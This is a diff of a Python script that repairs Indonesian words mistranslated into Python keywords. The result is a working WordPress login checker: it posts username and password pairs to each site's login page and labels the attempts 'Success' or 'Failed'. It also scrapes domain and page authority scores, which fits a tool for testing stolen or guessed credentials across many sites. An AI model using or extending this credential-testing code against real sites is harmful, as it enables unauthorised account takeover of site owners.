@@ -127,15 +127,15 @@ def try_login(asuna):
     r = requests.Session()
     try:
         cek = r.get(site, headers=hd, timeout=10)
-        if cek.status_code == 200 or cek.status_code == 403 atau 'Powered by WordPress' dalam cek.text atau '/wp-login.php' dalam cek.text:
+        if cek.status_code == 200 or cek.status_code == 403 or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
             login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
-            jika 'wp-admin/profile.php' dalam login.text atau 'Found' dalam login.text atau '/wp-admin' dalam login.text:
+            if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
                 return f"{site}#{user}@{pasw} - Success"
             else:
                 return f"{site}#{user}@{pasw} - Failed"
         else:
             return f"{site}#{user}@{pasw} - Not a WordPress site or inaccessible"
-    kecuali Exception sebagai e:
+    except Exception as e:
         return f"{site}#{user}@{pasw} - Error: {str(e)}"
 
 def check_da_pa(url):
@@ -148,7 +148,7 @@ def check_da_pa(url):
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.124 Safari/537.36'}
     data = {'domain': url, 'csrf_test_name': token}
     
-    jika response.status_code == 200:
+    if response.status_code == 200:
         soup = BeautifulSoup(response.text, 'html.parser')
         results = soup.find_all('div', {'class': 'result-area'})
         da = pa = 'Not found'
